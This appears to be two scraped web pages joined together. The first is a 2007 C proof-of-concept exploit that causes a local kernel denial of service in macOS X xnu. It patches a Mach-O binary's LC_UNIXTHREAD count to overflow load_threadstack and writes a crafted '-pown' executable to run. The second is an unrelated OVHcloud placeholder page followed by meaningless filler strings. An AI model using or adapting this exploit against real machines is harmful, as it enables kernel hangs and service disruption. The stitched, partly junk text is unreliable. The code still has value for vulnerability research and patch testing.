=== Content from www.digit-labs.org_b571ed53_20250125_074222.html ===
/\* xnu-macho-dos.c
\*
\* Copyright (c) 2007 by
\*
\* Apple MACOS X xnu <= 1228.0 local kernel DoS POC
\* by mu-b - Thu 15 Nov 2007
\*
\* - Tested on: Apple MACOS X 10.4 (xnu-792.22.5~1/RELEASE\_I386)
\* Apple MACOS X 10.5.1 (xnu-1228.0.2~1/RELEASE\_I386)
\* Apple MACOS X 10.5.1 (xnu-1228.0.2~1/RELEASE\_PPC)
\*
\* integer overflow causes infinite loop in load\_threadstack.
\* (bsd/kern/mach\_loader.c)
\*
\* - Private Source Code -DO NOT DISTRIBUTE -
\* http://www.digit-labs.org/ -- Digit-Labs 2007!@$!
\*/
#include
#include
#include
#include
#include
#include
#include
#define MAX\_PATH\_LEN 128
#define LC\_UNIXTHREAD 0x05
#define x86\_THREAD\_STATE32 0x01
/\* osfmk/mach-o/loader.h \*/
struct thread\_command {
unsigned long cmd; /\* LC\_THREAD or LC\_UNIXTHREAD \*/
unsigned long cmdsize; /\* total size of this command \*/
unsigned long flavor; /\* flavor of thread state \*/
unsigned long count; /\* count of longs in thread state \*/
};
static void \*
xmalloc (int num\_bytes)
{
char \*buf;
buf = malloc (num\_bytes);
if (buf == NULL)
{
fprintf (stderr, "malloc (): out of memory allocating %d-bytes!\n", num\_bytes);
exit (EXIT\_FAILURE);
}
return (buf);
}
int
main (int argc, char \*\* argv)
{
char fnbuf[MAX\_PATH\_LEN], \*ptr, \*cur, \*end;
int fd, wfd, found, size;
struct stat fbuf;
printf ("Apple MACOS X xnu <= 1228.0 local kernel DoS PoC\n"
"by: \n"
"http://www.digit-labs.org/ -- Digit-Labs 2007!@$!\n\n");
if (argc <= 1)
{
fprintf (stderr, "Usage: %s \n", argv[0]);
exit (EXIT\_SUCCESS);
}
if ((fd = open (argv[1], O\_RDONLY)) == -1)
{
perror ("open ()");
exit (EXIT\_FAILURE);
}
snprintf (fnbuf, sizeof fnbuf, "%s-pown", argv[1]);
if ((wfd = open (fnbuf, O\_RDWR | O\_CREAT)) == -1)
{
perror ("open ()");
exit (EXIT\_FAILURE);
}
if (fstat (fd, &fbuf) < 0)
{
perror ("fstat ()");
exit (EXIT\_FAILURE);
}
size = fbuf.st\_size;
ptr = xmalloc (sizeof (char) \* size);
end = ptr + size;
if (read (fd, ptr, size) < size)
{
unlink (fnbuf);
perror ("write ()");
exit (EXIT\_FAILURE);
}
close (fd);
for (cur = ptr, found = 0;
!found && cur + sizeof (struct thread\_command) < end;
cur += sizeof (unsigned long))
{
struct thread\_command \*thr\_cmd;
thr\_cmd = (struct thread\_command \*) cur;
if (thr\_cmd->cmd == LC\_UNIXTHREAD &&
thr\_cmd->flavor == x86\_THREAD\_STATE32)
{
thr\_cmd->count = 0x3FFFFFFE;
printf ("\* found at offset @0x%08X\n", cur - ptr);
found = 1;
}
}
if (!found)
{
unlink (fnbuf);
fprintf (stderr, "\* ARGH! hueristic didn't find our target!\n");
exit (EXIT\_FAILURE);
}
write (wfd, ptr, size);
fchmod(wfd, fbuf.st\_mode);
close (wfd);
free (ptr);
fprintf (stdout, "\* done\nexecute ./%s at your own risk!$%%!\n", fnbuf);
return (EXIT\_SUCCESS);
}


=== Content from www.vupen.com_3595e7bf_20250125_074222.html ===

[![](/__ovh/common/img/logo-white.png)](https://www.ovhcloud.com/)

![](/__ovh/common/img/icon-traffic-cone.png)

# Site en construction

![](/__ovh/common/img/shadow.png)

Besoin d'assistance ou d'informations ?

[![](/__ovh/common/img/icon-book.png)
Guides](https://docs.ovh.com/fr/hosting/ "Guides")
[![](/__ovh/common/img/icon-speech-bubble.png)
Forum](https://community.ovh.com/ "Forum")
[![](/__ovh/common/img/icon-user-support.png)
Contact](https://help.ovhcloud.com/fr/ "Contact")
[![](/__ovh/common/img/icon-app-gear.png)
Espace Client](https://www.ovh.com/manager/ "Espace Client")

Â© Copyright 1999 [OVHcloud](https://www.ovhcloud.com/)

v1v2v3v4v5v6v7v8v9v10v11v12v13v14v15v16v17v18v19v20v21v22v23v24v25v26v27v28v29v30v31v32v33v34v35v36v37v38v39v40v41v42v43v44v45v46v47v48v49v50v51v52v53v54v55v56v57v58v59v60v61v62v63v64v65v66v67v68v69v70

u1u2u3u4u5u6u7u8u9u10u11u12u13u14u15u16u17u18u19u20u21u22u23u24u25u26u27u28u29u30u31u32u33u34u35u36u37u38u39u40u41u42u43u44u45u46u47u48u49u50u51u52u53u54u55u56u57u58u59u60u61u62u63u64u65u66u67u68u69

p1p2p3p4p5p6p7p8p9p10p11p12p13p14p15p16p17p18p19p20p21p22p23p24p25p26p27p28p29p30p31p32p33p34p35p36p37p38p39p40p41p42p43p44p45p46p47p48p49p50p51p52p53p54p55p56p57p58p59p60p61p62p63p64

e1e2e3e4e5e6e7e8e9e10e11e12e13e14e15e16e17e18e19e20e21e22e23e24e25e26e27e28e29e30e31e32e33e34e35e36e37e38e39e40e41e42e43e44e45e46e47e48e49e50e51e52e53

n1n2n3n4n5n6n7n8n9n10n11n12n13n14n15n16n17n18n19n20n21n22n23n24n25n26n27n28n29n30n31n32n33n34n35n36n37n38n39n40n41n42n43n44n45n46n47n48n49n50n51n52n53n54n55n56n57n58n59n60n61n62

---

c1c2c3c4c5c6c7c8c9c10c11c12c13c14c15c16c17c18c19c20c21c22c23c24c25c26c27c28c29c30c31c32c33c34c35c36c37c38c39c40c41c42c43c44c45c46c47c48c49c50c51

o1o2o3o4o5o6o7o8o9o10o11o12o13o14o15o16o17o18o19o20o21o22o23o24o25o26o27o28o29o30o31o32o33o34o35o36o37o38o39o40o41o42o43o44o45o46o47o48o49o50o51o52o53o54o55o56o57o58o59o60o61o62o63

m1m2m3m4m5m6m7m8m9m10m11m12m13m14m15m16m17m18m19m20m21m22m23m24m25m26m27m28m29m30m31m32m33m34m35m36m37m38m39m40m41m42m43m44m45m46m47m48m49m50m51m52m53m54m55m56m57m58m59m60m61


